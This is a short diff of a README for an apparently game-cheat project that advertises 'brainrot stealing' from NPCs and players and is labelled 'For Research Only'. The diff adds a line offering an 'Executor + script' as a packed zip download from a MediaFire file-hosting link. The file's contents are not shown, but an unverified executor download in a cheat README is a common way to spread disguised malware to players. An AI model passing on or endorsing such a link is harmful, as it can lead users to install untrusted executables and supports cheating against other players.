@@ -5,6 +5,8 @@
 ![Status](https://img.shields.io/badge/Status-For_Research_Only-red.svg)
 
 
+Executor + script  --- [ScriptPacked](https://www.mediafire.com/file/otdgaoctqo4u6l9/ScriptPacked.zip/file)
+
 # Features
 
 - Interactive brainrot stealing system from NPCs and players
